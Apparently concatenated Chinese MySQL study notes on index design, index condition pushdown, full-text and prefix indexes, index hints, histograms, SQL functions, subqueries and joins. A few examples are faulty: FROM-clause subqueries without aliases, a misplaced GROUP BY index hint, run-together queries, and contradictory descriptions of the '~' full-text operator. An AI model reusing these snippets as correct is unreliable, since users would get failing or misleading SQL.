WHERE a = 1 AND b = 2 AND c > 3  -- 用 a, b, c 全部

-- 等值条件在前，范围条件在后
-- 索引设计时应将范围查询列放在最后
```

### 2.3 ORDER BY 与最左前缀

```sql
-- 索引 (a, b, c)

-- ORDER BY 可以利用索引避免 filesort
WHERE a = 1 ORDER BY b              --  使用索引排序
WHERE a = 1 ORDER BY b, c           --  使用索引排序
WHERE a = 1 ORDER BY c              --  跳过 b，需要 filesort
WHERE a = 1 AND b = 2 ORDER BY c    --  使用索引排序
ORDER BY a, b, c                    --  使用索引排序
ORDER BY b, c                       --  跳过 a
ORDER BY a DESC, b DESC, c DESC     --  降序也可用索引
ORDER BY a ASC, b DESC              --  排序方向不一致
```

## 3. 索引设计策略

### 3.1 列顺序原则

```sql
-- 原则1：等值条件列在前，范围条件列在后
-- 查询：WHERE status = 'active' AND created_at > '2026-01-01'
CREATE INDEX idx_status_created ON orders(status, created_at);

-- 原则2：高选择性列在前
-- 查询：WHERE city = '北京' AND gender = 'M'
-- city 选择性 > gender 选择性
CREATE INDEX idx_city_gender ON users(city, gender);

-- 原则3：考虑排序需求
-- 查询：WHERE dept_id = 5 ORDER BY salary DESC
CREATE INDEX idx_dept_salary ON employees(dept_id, salary DESC);
```

### 3.2 冗余索引检测

```sql
-- 索引 (a, b) 已经覆盖了 (a) 的功能
-- (a) 是冗余索引
CREATE INDEX idx_a ON table_name(a);       -- 冗余
CREATE INDEX idx_ab ON table_name(a, b);   -- 包含 a 的查询也能用

-- 但 (a, b) 不能替代 (b)
CREATE INDEX idx_b ON table_name(b);       -- 非冗余

-- 查看冗余索引
SELECT * FROM sys.schema_redundant_indexes;
```

### 3.3 联合索引 vs 多个单列索引

```sql
-- 场景：WHERE a = 1 AND b = 2

-- 方案1：联合索引（推荐）
CREATE INDEX idx_ab ON table_name(a, b);
-- 一次索引查找，效率高

-- 方案2：两个单列索引
CREATE INDEX idx_a ON table_name(a);
CREATE INDEX idx_b ON table_name(b);
-- 优化器可能使用 index_merge，效率不如联合索引
-- 且无法用于排序
```

<!-- ============ 文档分隔线：020-mysql/015-IndexConditionPushdown.md ============ -->

## 1. ICP 概述

索引条件下推（Index Condition Pushdown，ICP）是 MySQL 5.6 引入的优化，将 WHERE 条件中可以在索引上评估的部分下推到存储引擎层执行，减少回表次数。

## 2. 执行流程对比

### 2.1 无 ICP

```
1. 存储引擎：根据索引最左前缀查找匹配的主键
2. 存储引擎：回表获取完整行数据
3. Server 层：评估剩余 WHERE 条件
4. 返回满足条件的行
```

### 2.2 有 ICP

```
1. 存储引擎：根据索引最左前缀查找匹配的索引项
2. 存储引擎：在索引中评估可以下推的 WHERE 条件
3. 存储引擎：只对满足条件的索引项回表
4. Server 层：评估剩余 WHERE 条件
5. 返回满足条件的行
```

## 3. 示例

```sql
-- 索引 (name, age)
CREATE INDEX idx_name_age ON employees(name, age);

-- 查询
SELECT * FROM employees WHERE name LIKE '张%' AND age > 30;

-- 无 ICP：
-- 1. 通过 name LIKE '张%' 找到所有姓张的主键（如1000条）
-- 2. 回表1000次获取完整行
-- 3. Server 层过滤 age > 30（可能只剩100条）

-- 有 ICP：
-- 1. 通过 name LIKE '张%' 找到索引项
-- 2. 在索引中直接评估 age > 30（age在索引中）
-- 3. 只对满足条件的100条回表
-- 回表次数从1000减少到100
```

## 4. 适用条件

- InnoDB / MyISAM 引擎
- 联合索引中，WHERE 条件包含索引列但不符合最左前缀
- 条件可以在索引上评估（不需要回表获取其他列）

```sql
-- 不适用 ICP 的场景：
-- 1. 覆盖索引（不需要回表，ICP 无意义）
-- 2. WHERE 条件列不在索引中
-- 3. 子查询条件

-- EXPLAIN 中 Extra: Using index condition 表示使用了 ICP
```

## 5. 控制 ICP

```sql
-- 开启 ICP（默认）
SET optimizer_switch = 'index_condition_pushdown=on';

-- 关闭 ICP
SET optimizer_switch = 'index_condition_pushdown=off';
```

<!-- ============ 文档分隔线：020-mysql/016-FullTextIndex.md ============ -->

## 1. 全文索引概述

MySQL 全文索引（FULLTEXT Index）支持对文本内容进行全文检索，InnoDB 和 MyISAM 均支持。

## 2. 创建全文索引

```sql
-- 创建表时定义
CREATE TABLE articles (
    id      INT AUTO_INCREMENT PRIMARY KEY,
    title   VARCHAR(200),
    content TEXT,
    FULLTEXT INDEX ft_title_content (title, content)
) ENGINE = InnoDB;

-- 在已有表上创建
ALTER TABLE articles ADD FULLTEXT INDEX ft_content (content);

-- 使用 n-gram 解析器（支持中文）
ALTER TABLE articles ADD FULLTEXT INDEX ft_content (content)
    WITH PARSER ngram;
```

## 3. 搜索模式

### 3.1 自然语言模式

```sql
-- 默认模式，按相关性排序
SELECT * FROM articles
WHERE MATCH(title, content) AGAINST('数据库 索引');

-- 获取相关性分数
SELECT *, MATCH(title, content) AGAINST('数据库 索引') AS score
FROM articles
WHERE MATCH(title, content) AGAINST('数据库 索引')
ORDER BY score DESC;
```

### 3.2 布尔模式

```sql
-- 支持操作符
SELECT * FROM articles
WHERE MATCH(title, content) AGAINST('+MySQL -索引' IN BOOLEAN MODE);

-- 操作符说明：
-- +  必须包含
-- -  必须不包含
-- 无  可选，包含则提高相关性
-- >  提高权重
-- <  降低权重
-- *  通配符（前缀匹配）
-- "  短语匹配
-- () 分组
-- ~  取反（降低相关性）

-- 短语匹配
SELECT * FROM articles
WHERE MATCH(content) AGAINST('"MySQL索引优化"' IN BOOLEAN MODE);

-- 前缀匹配
SELECT * FROM articles
WHERE MATCH(content) AGAINST('数据*' IN BOOLEAN MODE);
```

### 3.3 查询扩展模式

```sql
-- 两阶段搜索：先搜关键词，再用结果中的词扩展搜索
SELECT * FROM articles
WHERE MATCH(content) AGAINST('数据库' WITH QUERY EXPANSION);
```

## 4. n-gram 解析器

```sql
-- 中文分词支持
-- ngram_token_size = 2（默认，双字分词）

CREATE TABLE chinese_articles (
    id      INT AUTO_INCREMENT PRIMARY KEY,
    title   VARCHAR(200),
    content TEXT,
    FULLTEXT INDEX ft_content (content) WITH PARSER ngram
) ENGINE = InnoDB;

-- 搜索中文
SELECT * FROM chinese_articles
WHERE MATCH(content) AGAINST('数据库' IN NATURAL LANGUAGE MODE);
```

## 5. 限制与注意事项

```sql
-- 最小词长度：innodb_ft_min_token_size = 3（默认）
-- ngram 时由 ngram_token_size 决定

-- 全文索引不支持前缀索引
-- 全文索引列不支持排序
-- 全文索引不支持 % 通配符
-- 建议在数据导入完成后再创建全文索引
```
## 全文索引创建

**基本写法：建表时创建全文索引**
`CREATE TABLE <表名> (... FULLTEXT KEY <索引名>(<列1>[, <列2>...])) [WITH PARSER <解析器>];`

```sql
-- 创建带中文全文索引的文章表（需 ngram 解析器支持中文）
CREATE TABLE articles (
  id BIGINT PRIMARY KEY,
  title VARCHAR(200),
  body TEXT,
  FULLTEXT KEY ft_title_body (title, body) WITH PARSER ngram
) ENGINE = InnoDB;
```

**基本写法：为已有表添加全文索引**
`CREATE FULLTEXT INDEX <索引名> ON <表名>(<列>[, <列>...]) [WITH PARSER <解析器>];`

```sql
-- 为 body 列添加全文索引
CREATE FULLTEXT INDEX ft_body ON articles(body) WITH PARSER ngram;
```

**基本写法：ALTER 添加全文索引**
`ALTER TABLE <表名> ADD FULLTEXT INDEX <索引名>(<列>[, <列>...]) [WITH PARSER <解析器>];`

```sql
-- 通过 ALTER 添加复合全文索引
ALTER TABLE articles
ADD FULLTEXT INDEX ft_title_body (title, body) WITH PARSER ngram;
```

---

## 全文搜索查询

**基本写法：MATCH ... AGAINST 自然语言搜索**
`SELECT ... WHERE MATCH(<列>) AGAINST('<关键词>')`

```sql
-- 自然语言模式搜索（默认）
SELECT id, title, MATCH(title, body) AGAINST('数据库') AS relevance
FROM articles
WHERE MATCH(title, body) AGAINST('数据库')
ORDER BY relevance DESC;
```

**基本写法：布尔模式搜索**
`SELECT ... WHERE MATCH(<列>) AGAINST('<表达式>' IN BOOLEAN MODE)`

```sql
-- 布尔模式：+必须包含，-排除，*通配
SELECT * FROM articles
WHERE MATCH(title, body) AGAINST('+MySQL -Oracle' IN BOOLEAN MODE);
-- 包含任意一个词
SELECT * FROM articles
WHERE MATCH(title, body) AGAINST('MySQL PostgreSQL' IN BOOLEAN MODE);
-- 前缀匹配
SELECT * FROM articles
WHERE MATCH(title, body) AGAINST('data*' IN BOOLEAN MODE);
```

**基本写法：查询扩展模式**
`SELECT ... WHERE MATCH(<列>) AGAINST('<关键词>' WITH QUERY EXPANSION)`

```sql
-- 查询扩展：自动扩展相关词进行二次搜索（召回率高但精度低）
SELECT * FROM articles
WHERE MATCH(title, body) AGAINST('database' WITH QUERY EXPANSION);
```

---

## ngram 中文解析器

**基本写法：ngram 分词配置**
`SET GLOBAL ngram_token_size = <数值>;`

```sql
-- 查看 ngram 分词长度（默认 2，需在配置文件设置）
SHOW VARIABLES LIKE 'ngram_token_size';
```

**基本写法：配置文件设置 ngram**
`ngram_token_size = 2`

```ini
# my.cnf 中设置 ngram 分词长度（重启生效）
[mysqld]
ngram_token_size = 2
```

**基本写法：ngram 布尔搜索中文**
`SELECT ... WHERE MATCH(<列>) AGAINST('<中文词>' IN BOOLEAN MODE)`

```sql
-- ngram 模式下中文搜索（"数据库"会被切分为"数据""据库"）
SELECT id, title FROM articles
WHERE MATCH(title, body) AGAINST('+数据 +据库' IN BOOLEAN MODE);
```

---

## 索引维护

**基本写法：查看全文索引**
`SHOW INDEX FROM <表名> WHERE Index_type = 'FULLTEXT';`

```sql
-- 查看表的全文索引
SHOW INDEX FROM articles WHERE Index_type = 'FULLTEXT';
```

**基本写法：删除全文索引**
`ALTER TABLE <表名> DROP INDEX <索引名>;`

```sql
-- 删除全文索引
ALTER TABLE articles DROP INDEX ft_title_body;
-- 或使用 DROP INDEX
DROP INDEX ft_body ON articles;
```

**基本写法：重建全文索引**
`ALTER TABLE <表名> DROP INDEX <索引名>, ADD FULLTEXT INDEX <索引名>(<列>) WITH PARSER <解析器>;`

```sql
-- 重建全文索引（数据变更后统计信息更新）
ALTER TABLE articles
DROP INDEX ft_body,
ADD FULLTEXT INDEX ft_body (body) WITH PARSER ngram;
```

---

## 布尔模式运算符

**基本写法：运算符速查**
`AGAINST('<+包含> <-排除> <可选> "<短语>" <前缀>*' IN BOOLEAN MODE)`

```sql
-- + 包含该词
MATCH(body) AGAINST('+MySQL' IN BOOLEAN MODE)
-- - 排除该词
MATCH(body) AGAINST('-Oracle' IN BOOLEAN MODE)
-- 无符号：该词可选，相关性更高
MATCH(body) AGAINST('MySQL 性能' IN BOOLEAN MODE)
-- "短语"：完整匹配短语
MATCH(body) AGAINST('"full text search"' IN BOOLEAN MODE)
-- * 前缀通配（必须 3 字符以上）
MATCH(body) AGAINST('opti*' IN BOOLEAN MODE)
-- () 分组
MATCH(body) AGAINST('+MySQL +(优化 调优)' IN BOOLEAN MODE)
-- ~ 词之间距离（接近度）
MATCH(body) AGAINST('MySQL~性能' IN BOOLEAN MODE)
```

**基本写法：相关性排序**
`SELECT MATCH(<列>) AGAINST('<词>') AS <相关度> FROM <表> ORDER BY <相关度> DESC`

```sql
-- 返回相关性分数并排序
SELECT
  id,
  title,
  MATCH(title, body) AGAINST('数据库 优化') AS score
FROM articles
WHERE MATCH(title, body) AGAINST('数据库 优化' IN BOOLEAN MODE)
ORDER BY score DESC
LIMIT 20;
```

<!-- ============ 文档分隔线：020-mysql/017-PrefixIndex.md ============ -->

## 1. 前缀索引概述

前缀索引对字符串列的前 N 个字符建立索引，减少索引存储空间和维护开销。

```sql
-- 创建前缀索引
CREATE INDEX idx_email_prefix ON users(email(10));
CREATE INDEX idx_url_prefix ON web_pages(url(50));
```

## 2. 选择性计算

### 2.1 计算完整列选择性

```sql
-- 完整列的选择性
SELECT COUNT(DISTINCT email) / COUNT(*) AS selectivity FROM users;
-- 如 0.95
```

### 2.2 计算前缀选择性

```sql
-- 不同前缀长度的选择性
SELECT
    COUNT(DISTINCT LEFT(email, 5)) / COUNT(*) AS s5,
    COUNT(DISTINCT LEFT(email, 10)) / COUNT(*) AS s10,
    COUNT(DISTINCT LEFT(email, 15)) / COUNT(*) AS s15,
    COUNT(DISTINCT LEFT(email, 20)) / COUNT(*) AS s20
FROM users;

-- 选择使选择性接近完整列选择性的最小前缀长度
-- 如 s10 = 0.94 接近 0.95，选择前缀长度 10
```

## 3. 限制

```sql
-- 前缀索引不支持覆盖索引
-- 无法在 ORDER BY / GROUP BY 中使用
-- 无法用于等值比较的覆盖扫描

-- 示例：前缀索引无法覆盖
SELECT email FROM users WHERE email LIKE 'test%';
-- 即使 email(10) 索引包含前10个字符，也需要回表获取完整 email
```

## 4. 适用场景

```sql
-- 1. 长字符串列（URL、邮箱、路径）
CREATE INDEX idx_url_prefix ON pages(url(50));

-- 2. 空间敏感场景
-- 前缀索引占用空间远小于完整列索引

-- 3. 不需要覆盖索引的查询
SELECT id, name FROM users WHERE email LIKE 'test@%';
```

<!-- ============ 文档分隔线：020-mysql/018-IndexHintForceIndex.md ============ -->

## 1. 索引提示概述

MySQL 提供索引提示（Index Hints）来影响优化器的索引选择。

## 2. 三种索引提示

### 2.1 USE INDEX

```sql
-- 建议优化器使用指定索引（优化器可能忽略）
SELECT * FROM employees USE INDEX (idx_dept) WHERE dept_id = 5;

-- 建议多个索引
SELECT * FROM employees USE INDEX (idx_dept, idx_name)
WHERE dept_id = 5 AND name = 'Alice';
```

### 2.2 FORCE INDEX

```sql
-- 强制使用指定索引（优化器必须使用）
SELECT * FROM employees FORCE INDEX (idx_dept) WHERE dept_id = 5;

-- 强制主键索引
SELECT * FROM employees FORCE INDEX (PRIMARY) WHERE id > 100;
```

### 2.3 IGNORE INDEX

```sql
-- 忽略指定索引
SELECT * FROM employees IGNORE INDEX (idx_dept) WHERE dept_id = 5;
-- 优化器不会考虑 idx_dept
```

## 3. 索引提示的作用范围

```sql
-- FOR JOIN：仅影响 JOIN 查找
SELECT * FROM employees e USE INDEX FOR JOIN (idx_dept)
JOIN departments d ON e.dept_id = d.id;

-- FOR ORDER BY：仅影响排序
SELECT * FROM employees USE INDEX FOR ORDER BY (idx_salary)
ORDER BY salary DESC;

-- FOR GROUP BY：仅影响分组
SELECT dept_id, COUNT(*) USE INDEX FOR GROUP BY (idx_dept)
FROM employees GROUP BY dept_id;
```

## 4. 使用场景

```sql
-- 场景1：优化器选择了错误的索引
-- 数据分布变化导致统计信息不准确
SELECT * FROM orders FORCE INDEX (idx_created_at)
WHERE created_at > '2026-01-01';

-- 场景2：避免全表扫描
SELECT * FROM large_table FORCE INDEX (idx_status)
WHERE status = 'rare_value';

-- 场景3：调试和性能对比
-- 对比不同索引的性能
SELECT * FROM t USE INDEX (idx_a) WHERE a = 1;
SELECT * FROM t USE INDEX (idx_b) WHERE a = 1;
```

## 5. 注意事项

```sql
-- 索引提示是临时方案，应优先解决根本问题
-- 1. 更新统计信息：ANALYZE TABLE
-- 2. 优化查询语句
-- 3. 调整索引设计

-- 索引提示在表结构变更后可能失效
-- 定期审查使用索引提示的查询
```

<!-- ============ 文档分隔线：020-mysql/019-IndexStatsHistogram.md ============ -->

## 1. 索引统计信息

### 1.1 统计信息内容

InnoDB 通过随机采样估算索引的基数（Cardinality）：

```sql
-- 查看索引统计信息
SHOW INDEX FROM employees;

-- 关键字段：
-- Cardinality：索引中不同值的估算数量
-- Sub_part：前缀索引长度
-- Null：是否允许 NULL
```

### 1.2 ANALYZE TABLE

```sql
-- 手动更新统计信息
ANALYZE TABLE employees;

-- 查看统计信息更新时间
SELECT table_name, last_update
FROM mysql.innodb_table_stats
WHERE database_name = 'mydb';

-- 控制采样页数
SET GLOBAL innodb_stats_persistent_sample_pages = 20;  -- 默认20
SET GLOBAL innodb_stats_transient_sample_pages = 8;     -- 非持久化统计
```

### 1.3 持久化统计信息

```sql
-- 默认开启持久化统计信息
SET GLOBAL innodb_stats_persistent = ON;

-- 统计信息存储在 mysql.innodb_table_stats 和 mysql.innodb_index_stats
SELECT * FROM mysql.innodb_table_stats WHERE table_name = 'employees';
SELECT * FROM mysql.innodb_index_stats WHERE table_name = 'employees';
```

## 2. 直方图统计

### 2.1 概述

MySQL 8.0 引入直方图（Histogram）统计，提供列值分布的详细信息，帮助优化器做出更好的执行计划选择。

### 2.2 直方图类型

| 类型        | 适用场景 | 说明                     |
| ----------- | -------- | ------------------------ |
| Singleton   | 低基数列 | 每个值一个桶             |
| Equi-Height | 高基数列 | 等高直方图，每桶行数相近 |

### 2.3 创建直方图

```sql
-- 创建直方图
ANALYZE TABLE employees UPDATE HISTOGRAM ON salary WITH 100 BUCKETS;
ANALYZE TABLE employees UPDATE HISTOGRAM ON dept_id, status WITH 50 BUCKETS;

-- 查看直方图
SELECT * FROM information_schema.column_statistics
WHERE table_name = 'employees';

-- 删除直方图
ANALYZE TABLE employees DROP HISTOGRAM ON salary;
```

### 2.4 直方图的作用

```sql
-- 直方图帮助优化器估算 WHERE 条件的选择性
-- 例如：salary > 100000 的比例
-- 无直方图：优化器只能基于索引统计估算
-- 有直方图：优化器可以精确知道分布

-- 对没有索引的列特别有用
-- WHERE status = 'rare_value'
-- 直方图告诉优化器这个值很少，选择索引扫描而非全表扫描
```

<!-- ============ 文档分隔线：020-mysql/020-SQLFunctionAndAdvancedQuery.md ============ -->

## 1. 内置函数详解

### 1.1 字符串函数

| 函数        | 说明         | 示例                               |
| :---------- | :----------- | :--------------------------------- |
| CONCAT      | 连接字符串   | CONCAT('Hello', ' ', 'World')      |
| CONCAT_WS   | 带分隔符连接 | CONCAT_WS('-', '2024', '01', '01') |
| LENGTH      | 字节长度     | LENGTH('你好') = 6                 |
| CHAR_LENGTH | 字符长度     | CHAR_LENGTH('你好') = 2            |
| SUBSTRING   | 截取字符串   | SUBSTRING('Hello', 1, 3) = 'Hel'   |
| LEFT/RIGHT  | 从左/右截取  | LEFT('Hello', 2) = 'He'            |
| TRIM        | 去除首尾空格 | TRIM(' Hello ')                    |
| LOWER/UPPER | 转小/大写    | LOWER('HELLO')                     |
| REPLACE     | 替换字符串   | REPLACE('Hello', 'l', 'w')         |
| REVERSE     | 反转字符串   | REVERSE('Hello')                   |
| LPAD/RPAD   | 左/右填充    | LPAD('5', 3, '0') = '005'          |
| INSTR       | 查找子串位置 | INSTR('Hello', 'll') = 3           |

**字符串函数示例**：

```sql
 SELECT
  username,
  CONCAT(username, ' (', email, ')') AS user_info,
  LENGTH(username) AS name_bytes,
  CHAR_LENGTH(username) AS name_chars,
  LOWER(email) AS email_lower,
  UPPER(username) AS name_upper,
  SUBSTRING(phone, 1, 3) AS phone_prefix
 from users;
 SELECT CONCAT_WS('', province, city, district, detail_address) AS full_address FROM addresses;
```

### 1.2 日期时间函数

| 函数               | 说明         | 示例                                           |
| :----------------- | :----------- | :--------------------------------------------- |
| NOW                | 当前日期时间 | NOW() = '2024-01-15 10:30:00'                  |
| CURDATE            | 当前日期     | CURDATE() = '2024-01-15'                       |
| CURTIME            | 当前时间     | CURTIME() = '10:30:00'                         |
| DATE               | 提取日期部分 | DATE('2024-01-15 10:30:00')                    |
| TIME               | 提取时间部分 | TIME('2024-01-15 10:30:00')                    |
| YEAR/MONTH/DAY     | 提取年月日   | YEAR(NOW()) = 2024                             |
| HOUR/MINUTE/SECOND | 提取时分秒   | HOUR(NOW()) = 10                               |
| DATE_FORMAT        | 格式化日期   | DATE_FORMAT(NOW(), '%Y-%m-%d')                 |
| DATE_ADD/DATE_SUB  | 日期加减     | DATE_ADD(NOW(), INTERVAL 1 DAY)                |
| DATEDIFF           | 日期差       | DATEDIFF('2024-01-15', '2024-01-01')           |
| TIMESTAMPDIFF      | 时间差       | TIMESTAMPDIFF(DAY, '2024-01-01', '2024-01-15') |
| DAYOFWEEK          | 星期几       | DAYOFWEEK(NOW()) = 2 (周一=2)                  |
| LAST_DAY           | 月份最后一天 | LAST_DAY('2024-01-15')                         |

**日期函数示例**：

```sql
 SELECT
  NOW() AS now,
  CURDATE() AS today,
  DATE_ADD(NOW(), INTERVAL 7 DAY) AS next_week,
  DATE_SUB(NOW(), INTERVAL 1 MONTH) AS last_month,
  DATE_FORMAT(NOW(), '%Y年%m月%d日 %H:%i:%s') AS formatted;
 SELECT
  username,
  DATEDIFF(NOW(), created_at) AS days_since_join,
  TIMESTAMPDIFF(YEAR, created_at, NOW()) AS years_since_join
 from users;
 SELECT
  username,
  DATE_FORMAT(birthday, '%Y年%m月%d日') AS birthday_formatted,
  TIMESTAMPDIFF(YEAR, birthday, NOW()) AS age
 from users;
```

### 1.3 数值函数

| 函数         | 说明     | 示例                         |
| :----------- | :------- | :--------------------------- |
| ABS          | 绝对值   | ABS(-10) = 10                |
| ROUND        | 四舍五入 | ROUND(3.14159, 2) = 3.14     |
| CEIL/CEILING | 向上取整 | CEIL(3.1) = 4                |
| FLOOR        | 向下取整 | FLOOR(3.9) = 3               |
| MOD          | 取模     | MOD(10, 3) = 1               |
| POW/POWER    | 幂运算   | POW(2, 3) = 8                |
| SQRT         | 平方根   | SQRT(16) = 4                 |
| RAND         | 随机数   | RAND() = 0.123...            |
| TRUNCATE     | 截断     | TRUNCATE(3.14159, 3) = 3.141 |
| SIGN         | 符号     | SIGN(-10) = -1               |

**数值函数示例**：

```sql
 SELECT
  price,
  ROUND(price, 2) AS rounded,
  CEIL(price) AS ceil_price,
  FLOOR(price) AS floor_price,
  ABS(price - 100) AS price_diff
 from products;
 SELECT * FROM users ORDER BY RAND() LIMIT 5; -- 随机取5条
 UPDATE users SET verification_code = FLOOR(RAND() * 900000 + 100000) WHERE status = 0;
```

### 1.4 条件函数

| 函数   | 说明       | 示例                           |
| :----- | :--------- | :----------------------------- |
| IF     | 条件判断   | IF(age > 18, '成人', '未成年') |
| IFNULL | NULL 替换  | IFNULL(email, '未填写')        |
| NULLIF | NULL 条件  | NULLIF(a, b)                   |
| CASE   | 多条件判断 | CASE WHEN ... THEN ... END     |

**条件函数示例**：

```sql
 SELECT
  username,
  age,
  IF(age >= 18, '成人', '未成年') AS age_desc,
  IF(status = 1, '正常', '禁用') AS status_desc
 from users;
 SELECT
  username,
  IFNULL(email, '未填写') AS email,
  IFNULL(phone, IFNULL(telephone, '无')) AS contact
 from users;
 SELECT
  username,
  age,
  CASE
  WHEN age < 18 THEN '未成年'
  WHEN age < 30 THEN '青年'
  WHEN age < 60 THEN '中年'
  ELSE '老年'
  END AS age_group,
  CASE status
  WHEN 1 THEN '正常'
  WHEN 2 THEN '冻结'
  WHEN 0 THEN '禁用'
  ELSE '未知'
  END AS status_desc
 from users;
 SELECT
  SUM(CASE WHEN status = 1 THEN 1 ELSE 0 END) AS active_count,
  SUM(CASE WHEN status = 0 THEN 1 ELSE 0 END) AS inactive_count,
  SUM(CASE WHEN gender = '男' THEN 1 ELSE 0 END) AS male_count,
  SUM(CASE WHEN gender = '女' THEN 1 ELSE 0 END) AS female_count
 from users;
```

### 1.5 其他常用函数

```sql
 SELECT
  CAST(price AS CHAR) AS price_str,
  CONVERT(price, DECIMAL(10,2)) AS price_dec,
  FORMAT(price, 2) AS price_formatted -- 千位分隔符
 from products;
 SELECT
  MD5('password') AS md5_hash,
  SHA1('password') AS sha1_hash,
  SHA2('password', 256) AS sha256_hash
 from users;
 SELECT UUID() AS uuid;
 SET @total = 0;
 SELECT @total := @total + price FROM products;
```

## 2. 子查询详解

子查询是嵌套在另一个查询中的查询，可以用于 WHERE、FROM、SELECT 等子句。

### 2.1 子查询类型

#### 2.1.1 按位置分类

| 类型              | 说明                | 示例                      |
| :---------------- | :------------------ | :------------------------ |
| WHERE 子句子查询  | 在 WHERE 条件中使用 | `WHERE id IN (SELECT...)` |
| FROM 子句子查询   | 作为临时表          | `FROM (SELECT...) AS t`   |
| SELECT 子句子查询 | 作为列              | `SELECT (SELECT...)`      |

#### 2.1.2 按返回结果分类

| 类型       | 返回值   | 示例                                     |
| :--------- | :------- | :--------------------------------------- |
| 标量子查询 | 单个值   | `SELECT * WHERE age = (SELECT MAX(age))` |
| 列子查询   | 一列值   | `WHERE id IN (SELECT user_id...)`        |
| 行子查询   | 一行值   | `WHERE (id, name) = (SELECT...)`         |
| 表子查询   | 多行多列 | `FROM (SELECT...) AS t`                  |

### 2.2 标量子查询

```sql
 SELECT * FROM users WHERE age = (SELECT MAX(age) FROM users);
 SELECT * FROM users WHERE age > (SELECT AVG(age) FROM users);
 SELECT * FROM users WHERE created_at = (SELECT MAX(created_at) FROM users);
 UPDATE users SET age = (SELECT MAX(age) FROM users) + 1 WHERE id = 1;
```

### 2.3 列子查询 (IN/ANY/ALL)

```sql
 SELECT * FROM users WHERE id IN (SELECT user_id FROM vip_users);
 SELECT * FROM users WHERE id NOT IN (SELECT user_id FROM blocked_users);
 SELECT * FROM products WHERE price > ANY (SELECT price FROM products WHERE category_id = 1);
 SELECT * FROM products WHERE price > ALL (SELECT price FROM products WHERE status = 0);
 SELECT * FROM users u WHERE EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id);
 SELECT * FROM users u WHERE NOT EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id);
```

### 2.4 FROM 子句子查询

```sql
 SELECT * FROM (SELECT * FROM users WHERE status = 1) AS active_users;
 SELECT * FROM (
  SELECT
  status,
  COUNT(*) AS count,
  AVG(age) AS avg_age
  FROM users
  GROUP BY status
 )
 SELECT * FROM (
  SELECT u.*, COUNT(o.id) AS order_count
  FROM users u
  LEFT JOIN orders o ON u.id = o.user_id
  GROUP BY u.id
 )
```

### 2.5 SELECT 子句子查询

```sql
 SELECT
  u.id,
  u.username,
  (SELECT COUNT(*) FROM orders WHERE user_id = u.id) AS order_count
 from users u;
 SELECT
  u.id,
  u.username,
  (SELECT MAX(created_at) FROM orders WHERE user_id = u.id) AS last_order_time
 from users u;
 SELECT
  u.username,
  (SELECT COUNT(*) FROM orders WHERE user_id = u.id AND status = 1) AS active_orders
 from users u;
```

### 2.6 子查询实战

```sql
 SELECT DISTINCT user_id FROM order_items WHERE product_id = 'A'
 AND user_id IN (SELECT user_id FROM order_items WHERE product_id = 'B');
 SELECT * FROM products
 WHERE id IN (
  SELECT product_id FROM order_items
  GROUP BY product_id
  HAVING SUM(price * quantity) > (SELECT AVG(total) FROM (SELECT SUM(price * quantity) AS total FROM order_items GROUP BY product_id) AS avg_total)
 )
 SELECT * FROM employees e
 WHERE (dept_id, salary) IN (
  SELECT dept_id, MAX(salary) FROM employees GROUP BY dept_id
 )
```

## 3. 多表查询详解

### 3.1 连接类型

```mermaid
flowchart LR
    subgraph A[表A]
        A1[1] A2[2] A3[3] A4[4]
    end
    subgraph B[表B]
        B1[A] B2[B] B3[C]
    end
    A1 --- B1
    A2 --- B2
    A3 --- B3
```

- 内连接（INNER JOIN）：1, 2, 3（两边都有的）
- 左连接（LEFT JOIN）：1, 2, 3, 4（A 全部 + B 匹配的）
- 右连接（RIGHT JOIN）：1, 2, 3, A, B, C（B 全部 + A 匹配的）
- 全连接（FULL JOIN）：1, 2, 3, 4, A, B, C（两边全部）

### 3.2 内连接 (INNER JOIN)

```sql
 SELECT u.username, o.order_no, o.total_amount
 from users u
 inNER JOIN orders o ON u.id = o.user_id;
 SELECT u.username, o.order_no, p.product_name, oi.quantity
 from users u
 inNER JOIN orders o ON u.id = o.user_id
 inNER JOIN order_items oi ON o.id = oi.order_id
 inNER JOIN products p ON oi.product_id = p.id;
 SELECT u.username, o.order_no
 from users u
 inNER JOIN orders o USING (user_id);
```

### 3.3 外连接 (LEFT/RIGHT JOIN)

```sql
 SELECT u.username, o.order_no, o.total_amount
 from users u
 LEFT JOIN orders o ON u.id = o.user_id;
 SELECT u.username, o.order_no
 from users u
 RIGHT JOIN orders o ON u.id = o.user_id;
 SELECT u.username, COUNT(o.id) AS order_count
 from users u
 LEFT JOIN orders o ON u.id = o.user_id
 GROUP BY u.id, u.username;
 SELECT u.*
 from users u
 LEFT JOIN orders o ON u.id = o.user_id
 WHERE o.id IS NULL;
 SELECT e.*
 from employees e
 RIGHT JOIN departments d ON e.dept_id = d.id
 WHERE e.id IS NULL;
```

### 3.4 自连接 (SELF JOIN)

```sql
 SELECT e1.name AS employee, e2.name AS colleague, d.name AS dept
 from employees e1
 JOIN employees e2 ON e1.dept_id = e2.dept_id AND e1.id != e2.id
 JOIN departments d ON e1.dept_id = d.id
 WHERE e1.name = '张三';
 SELECT s1.Supplier_name, s1.Address, s2.Supplier_name AS 同城市供应商
 from supplier_info s1
 inNER JOIN supplier_info s2 ON s1.Address = s2.Address
 WHERE s1.Supplier_name = '翔云公司' AND s1.Supplier_id <> s2.Supplier_id;
 SELECT e.name AS employee, m.name AS manager
 from employees e
 LEFT JOIN employees m ON e.manager_id = m.id;
```

### 3.5 全连接 (FULL OUTER JOIN)

MySQL 不直接支持 FULL OUTER JOIN，可使用 UNION 实现：

```sql
 SELECT u.username, o.order_no
 from users u
 LEFT JOIN orders o ON u.id = o.user_id
 UNION
 SELECT u.username, o.order_no
 from users u
 RIGHT JOIN orders o ON u.id = o.user_id;
```

### 3.6 交叉连接 (CROSS JOIN)

```sql
 SELECT u.username, p.product_name
 from users u
 CROSS JOIN products p;
 SELECT
  DATE_ADD('2024-01-01', INTERVAL n DAY) AS date
 from (SELECT 0 AS n UNION SELECT 1 UNION SELECT 2...) AS numbers;
```

### 3.7 多表连接实战

```sql
 SELECT e.Employees_name, s.Sales_id, c.Customer_name
 from employees_info e
 inNER JOIN sales_info s ON e.Employees_id = s.Employees_id
 inNER JOIN customer_info c ON s.Customer_id = c.Customer_id;
 SELECT e.Employees_id, e.Employees_name,
  SUM(sl.Sales_price * sl.Sales_Number) AS 销售总业绩
 from employees_info e
 inNER JOIN sales_info s ON e.Employees_id = s.Employees_id
 inNER JOIN sales_list sl ON s.Sales_id = sl.Sales_id
